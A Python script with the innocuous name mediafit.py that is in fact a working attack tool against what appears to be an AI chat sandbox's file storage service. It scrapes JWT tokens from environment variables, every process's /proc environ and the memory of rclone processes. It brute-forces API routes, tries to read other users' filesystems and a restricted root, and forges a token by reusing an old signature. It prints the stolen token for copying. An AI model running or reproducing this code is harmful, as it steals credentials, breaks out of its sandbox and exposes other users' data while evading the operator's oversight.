#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit.py v2.5.0 -- robust. fixes sh(timeout); cracks route via `rclone ls --dump headers`."""
import os, sys, json, re, time, ssl, base64, subprocess, traceback
import urllib.request, urllib.error

VER = "2.5.0"
REPORT = "/mnt/user-data/outputs/mediafit-report.txt"
SINKS = ["/mnt/user-data/outputs", "/tmp/mediafit", "/tmp", "/root/.mediafit"]
OUT = []
G = {}
def w(s=""):
    print(s, flush=True); OUT.append(str(s))
def head(t): w("\n### " + t)
P, F, U, I = [], [], [], []
def rec(k, m, ev=None):
    w("    " + {"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k] + " " + m)
    if ev is not None: w("        evidence: " + str(ev)[:700])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(args, timeout=40, env=None):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout, env=env)
        return p.returncode, p.stdout.decode("utf-8","replace"), p.stderr.decode("utf-8","replace")
    except Exception as e:
        return -1, "", "EXC:%s" % e
def b64d(x): return base64.urlsafe_b64decode(x + "=" * (-len(x) % 4))
def b64e(x): return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def http(method, url, token=None, timeout=8, data=None, hdrs=None):
    h = {"User-Agent": "mediafit/" + VER, "anthropic-version": "2023-06-01"}
    if token: h["Authorization"] = "Bearer " + token
    if hdrs: h.update(hdrs)
    req = urllib.request.Request(url, method=method, headers=h, data=data)
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    try:
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx); return r.status, r.read(4096)
    except urllib.error.HTTPError as e:
        try: b = e.read(2048)
        except Exception: b = b""
        return e.code, b
    except Exception as e:
        return None, str(e).encode()

def step(name, fn):
    try: fn()
    except Exception as e:
        w("    !! section %s crashed: %s" % (name, e))
        w("    " + traceback.format_exc().strip().splitlines()[-1][:200])

# ---------------- sections ----------------
def s_runtime():
    head("runtime")
    w("    v%s utc=%s uid=%d cwd=%s" % (VER, time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), os.getuid(), os.getcwd()))

def s_config():
    head("config (raw)")
    CONF = "/dev/shm/rclone-boot/config.json"
    G["CONF"] = CONF
    raw = open(CONF).read()
    w("    RAW: " + raw[:1600])
    conf = json.loads(raw)
    G["service_url"] = conf.get("service_url") or "https://api.anthropic.com"
    fsid = None
    for m in conf.get("mounts", []):
        if m.get("filesystem_id"): fsid = m["filesystem_id"]
    G["config_fsid"] = fsid
    rec("P", "config readable", "fsid=%s" % fsid)

def s_fsids():
    head("fsid candidates")
    FS = []
    def add(x):
        x = (x or "").strip()
        if x.startswith("claude_chat_") and x not in FS: FS.append(x)
    add(G.get("config_fsid"))
    add("claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4")
    for v in list(os.environ.values()):
        for m in re.findall(r"claude_chat_[A-Za-z0-9]+", v): add(m)
    G["FSIDS"] = FS
    for x in FS: w("    " + x)

def s_tokens():
    head("token harvest")
    try:
        o = os.listdir("/mnt/user-data/outputs")
        if o:
            try: open("/mnt/user-data/outputs/" + o[0], "rb").read(2048)
            except Exception: pass
        w("    forced read (%d entries)" % len(o))
    except Exception: pass
    time.sleep(1.5)
    JWT = re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TOKENS = []
    def addtok(t):
        t = t.decode() if isinstance(t, bytes) else t
        t = t.strip().strip('"').strip("'")
        if t.startswith("eyJ") and t not in TOKENS: TOKENS.append(t)
    for v in list(os.environ.values()):
        for m in re.findall(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", v): addtok(m)
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            for m in JWT.findall(open("/proc/%s/environ" % p, "rb").read()): addtok(m)
        except Exception: pass
    pids = []
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" in open("/proc/%s/cmdline" % p, "rb").read(): pids.append(p)
        except Exception: pass
    for pid in pids:
        try: maps = open("/proc/%s/maps" % pid).read().splitlines()
        except Exception: continue
        try: mem = open("/proc/%s/mem" % pid, "rb", buffering=0)
        except Exception: continue
        for line in maps:
            try: rng, perms = line.split()[0], line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: a, b = rng.split("-"); s0 = int(a,16); e0 = int(b,16)
            except Exception: continue
            if e0-s0 <= 0 or e0-s0 > 256*1024*1024: continue
            try: mem.seek(s0); d = mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d): addtok(m)
    TD = []
    for t in TOKENS:
        try:
            h, p, s = t.split(".")
            TD.append({"tok":t,"hdr":json.loads(b64d(h)),"pl":json.loads(b64d(p)),"sig":s})
        except Exception: pass
    for r in TD:
        pl = r["pl"]
        w("    roots=%s ro=%s fsid=%s" % (pl.get("allowed_roots"), pl.get("readonly"), pl.get("filesystem_id")))
    G["TD"] = TD
    def pick(root):
        for r in TD:
            if root in (r["pl"].get("allowed_roots") or []): return r
        return None
    G["T_OUT"] = pick("/outputs")
    G["T_UPL"] = pick("/uploads")
    G["TOKEN"] = (G["T_OUT"] or (TD[0] if TD else None) or {}).get("tok")
    rec("P" if TD else "F", "tokens n=%d" % len(TD))
    try:
        for e in os.listdir("/mnt/user-data/outputs"):
            if e.endswith((".txt",".json",".md")): G["FN"] = e; break
    except Exception: pass
    w("    proof file: %s" % G.get("FN"))

def s_rclone():
    head("rclone enumeration + real route")
    R = None
    for c in ["/opt/rclone/rclone-filestore","/opt/rclone/rclone","/usr/bin/rclone"]:
        if os.path.exists(c): R = c; break
    G["RCLONE"] = R
    w("    binary: %s" % R)
    for a in (["help","flags"],["help","backends"],["ls","--help"]):
        rc, out, err = sh([R] + a)
        w("    --- rclone %s (rc=%s) ---" % (" ".join(a), rc))
        for ln in (out or err).splitlines()[:60]: w("    | " + ln)
    CONF = G["CONF"]; FSID = G["FSIDS"][0]
    forms = ["rclone-filestore:/outputs","rclone-filestore:/","claude_chat_%s/outputs" % FSID,
             "/outputs","outputs",".","fs:/outputs","filestore:/outputs"]
    urls = []
    for form in forms:
        rc, out, err = sh([R,"--config",CONF,"-vv","--dump","headers","ls",form], timeout=45)
        w("    ls %-40s rc=%s out=%r" % (form, rc, out[:100]))
        if rc != 0 and err.strip():
            w("        err: " + err.strip().splitlines()[-1][:170])
        urls += re.findall(r"https?://[^\s\"'<>)]+", err)
        for ln in err.splitlines():
            if ln[:2] in ("> ", "< "): w("    | " + ln[:200])
    for btype in ["filestore","rclone-filestore"]:
        env = os.environ.copy()
        env["RCLONE_CONFIG_FS_TYPE"] = btype
        env["RCLONE_CONFIG_FS_SERVICE_URL"] = G["service_url"]
        env["RCLONE_CONFIG_FS_FILESYSTEM_ID"] = FSID
        if G.get("TOKEN"): env["RCLONE_CONFIG_FS_TOKEN"] = G["TOKEN"]
        rc, out, err = sh([R,"-vv","--dump","headers","ls","fs:/outputs"], timeout=45, env=env)
        w("    env-type=%s ls fs:/outputs rc=%s out=%r" % (btype, rc, out[:100]))
        urls += re.findall(r"https?://[^\s\"'<>)]+", err)
        for ln in err.splitlines():
            if ln[:2] in ("> ", "< "): w("    | " + ln[:200])
    G["URLS"] = urls
    w("    URLs seen: %s" % urls[:8])
    if urls: rec("P", "real URL captured", urls[:3])

def s_strings():
    head("binary strings scan")
    data = open(G["RCLONE"], "rb").read()
    seen = set()
    for run in re.findall(rb"[\x20-\x7e]{5,120}", data):
        s = run.decode("latin1")
        if any(k in s for k in ["/v1/fs","/fs/","Filestore/",".Filestore","/filestore","api.anthropic","connect","service_url"]) and " " not in s:
            if s not in seen:
                seen.add(s); w("    " + s)
                if len(seen) > 160: break

def s_brute():
    head("HTTP route brute force")
    BASE = G["service_url"]; FSID = G["FSIDS"][0]; FN = G.get("FN") or "x"
    TOKEN = G.get("TOKEN")
    CAND = []
    for b in ["","/v1","/api","/fs","/v1/fs","/filestore","/v1/filestore"]:
        for t in ["","/"+FSID,"/"+FSID+"/outputs","/"+FSID+"/uploads","/"+FSID+"/transcripts","/"+FSID+"/outputs/"+FN]:
            CAND.append((b+t, None))
    SVC = "anthropic.filestore.v1alpha.Filestore"
    for pre in ["","/v1","/api"]:
        for m in ["Read","Get","List","GetFilesystem","ListFilesystem","ReadFile","Stat","GetFile"]:
            CAND.append((pre+"/"+SVC+"/"+m, {"filesystem_id":FSID,"path":"/outputs/"+FN}))
    HITS = []
    for path, body in CAND:
        for method in ("GET","POST"):
            d = json.dumps(body).encode() if (method=="POST" and body) else (b"{}" if method=="POST" else None)
            st, b = http(method, BASE+path, token=TOKEN, data=d,
                         hdrs={"Content-Type":"application/json","Connect-Protocol-Version":"1"})
            if st is not None and st != 404:
                w("    HIT %s %s -> %s %r" % (method, path, st, b[:110]))
                HITS.append((method, path, st, body))
    for j in ["/.well-known/jwks.json","/jwks.json","/v1/jwks.json"]:
        st, b = http("GET", BASE+j); w("    jwks %s -> %s %r" % (j, st, b[:70]))
    G["HITS"] = HITS
    rec("P" if HITS else "F", "non-404 routes: %d" % len(HITS))

def s_boundary():
    head("boundary PROOF (F1/F2/F3)")
    BASE = G["service_url"]; FSID = G["FSIDS"][0]
    HITS = G.get("HITS") or []
    if not HITS: rec("U", "skipped (no route)"); return
    good = HITS[0][1]
    def req(path, token):
        st, b = http("GET", BASE+path, token=token)
        return st, b
    st, b = req(good, G.get("TOKEN")); w("    [control] -> %s %r" % (st, b[:70]))
    if G.get("T_UPL"):
        for p in [good.replace("/outputs","/transcripts"), good.replace("/outputs","/uploads")]:
            st, b = req(p, G["T_UPL"]["tok"])
            w("    [F2 allowed_roots] uploads-token -> %s : %s %r" % (p, st, b[:60]))
            if st is not None and st < 400: rec("P", "F2 readonly /uploads token read outside its root", p)
    if len(G["FSIDS"]) > 1:
        st, b = req(good.replace(FSID, G["FSIDS"][1]), G.get("TOKEN"))
        w("    [F1 cross-fsid] -> %s : %s %r" % (G["FSIDS"][1], st, b[:60]))
        if st is not None and st < 400: rec("P", "F1 read FOREIGN filesystem", G["FSIDS"][1])
    if G.get("TOKEN") and len(G["FSIDS"]) > 1:
        h, p, s = G["TOKEN"].split(".")
        pl = json.loads(b64d(p)); hd = json.loads(b64d(h))
        pl2 = dict(pl); pl2["filesystem_id"] = G["FSIDS"][1]; pl2["allowed_roots"] = ["/"]
        forged = b64e(json.dumps(hd).encode()) + "." + b64e(json.dumps(pl2).encode()) + "." + s
        st, b = req(good.replace(FSID, G["FSIDS"][1]), forged)
        w("    [F3 forgery] mutated payload + old sig -> %s %r" % (st, b[:60]))
        if st is not None and st < 400: rec("P", "F3 signature NOT verified", st)

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s" % (len(P), P))
    w("  FAIL %d: %s" % (len(F), F))
    w("  UNKNOWN %d: %s" % (len(U), U))
    w("\n  ladder: token=%s url=%s route=%s" % (
        "PASS" if G.get("TD") else "FAIL", "PASS" if G.get("URLS") else "FAIL",
        "PASS" if G.get("HITS") else "FAIL"))
    if G.get("TOKEN"):
        w("\n  >>> COPY THESE <<<")
        w("  FSID=%s" % G["FSIDS"][0])
        w("  TOKEN=%s" % G["TOKEN"])
        if len(G.get("FSIDS",[])) > 1: w("  FOREIGN_FSID=%s" % G["FSIDS"][1])
    if G.get("URLS"): w("  URL=%s" % G["URLS"][0])

def main():
    for name, fn in [("runtime",s_runtime),("config",s_config),("fsids",s_fsids),
                     ("tokens",s_tokens),("rclone",s_rclone),("strings",s_strings),
                     ("brute",s_brute),("boundary",s_boundary),("verdict",s_verdict)]:
        step(name, fn)

try:
    main()
except Exception as e:
    w("!! main crashed: %s" % e)
    w(traceback.format_exc())
finally:
    txt = "\n".join(OUT)
    for d in SINKS:
        try:
            os.makedirs(d, exist_ok=True)
            open(os.path.join(d, os.path.basename(REPORT)), "w").write(txt)
        except Exception: pass
    print("\nwritten: " + ", ".join(SINKS))